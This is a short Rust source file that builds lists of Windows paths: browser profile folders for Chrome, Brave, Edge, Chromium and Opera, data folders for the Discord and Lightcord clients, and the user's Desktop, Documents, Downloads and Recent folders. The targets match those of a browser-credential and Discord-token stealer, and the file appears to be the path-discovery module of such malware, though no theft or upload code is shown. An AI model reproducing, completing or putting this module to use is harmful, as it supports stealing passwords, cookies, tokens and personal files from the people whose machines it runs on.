use std::env;
use once_cell::sync::Lazy;
use dirs;

pub fn get_browser_paths() -> &'static Vec<String> {
    static BROWSER_PATHS: Lazy<Vec<String>> = Lazy::new(|| {
        let mut paths: Vec<String> = Vec::new();

        let local = env::var("LOCALAPPDATA").unwrap_or_default();
        let roaming = env::var("APPDATA").unwrap_or_default();

        let browsers = [
            ("Google Chrome", format!("{}\\Google\\Chrome\\User Data", local)),
            ("Opera", format!("{}\\Opera Software\\Opera Stable", roaming)),
            ("Brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local)),
            ("Opera GX", format!("{}\\Opera Software\\Opera GX Stable", roaming)),
            ("Microsoft Edge", format!("{}\\Microsoft\\Edge\\User Data", local)),
            ("Chromium", format!("{}\\Chromium\\User Data", local)),
        ];

        for (browser, path) in &browsers {
            if vec!["Google Chrome", "Brave", "Microsoft Edge", "Chromium"].contains(browser) {
                for profile in &vec!["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"] {
                    paths.push(format!("{}\\{}", path, profile));
                }
            } else {
                paths.push(path.to_string());
            }
        }

        paths
    });

    &BROWSER_PATHS
}

pub fn get_desktop_paths() -> &'static Vec<String> {
    static DESKTOP_PATHS: Lazy<Vec<String>> = Lazy::new(|| {
        let roaming = env::var("APPDATA").unwrap_or_default();

        vec![
            format!("{}\\Lightcord", roaming),
            format!("{}\\Discord", roaming),
            format!("{}\\discordcanary", roaming),
            format!("{}\\discordptb", roaming),
        ]
    });

    &DESKTOP_PATHS
}

pub fn get_files_paths() -> &'static Vec<String> {
    static FILES_PATHS: Lazy<Vec<String>> = Lazy::new(|| {
        let user = dirs::home_dir().and_then(|path| path.to_str().map(|s| s.to_string())).unwrap_or_default();
        let roaming = env::var("APPDATA").unwrap_or_default();

        vec![
            format!("{}\\Desktop", user),
            format!("{}\\OneDrive\\Desktop", user),
            format!("{}\\Documents", user),
            format!("{}\\Downloads", user),
            format!("{}\\Microsoft\\Windows\\Recent", roaming),
        ]
    });

    &FILES_PATHS
}
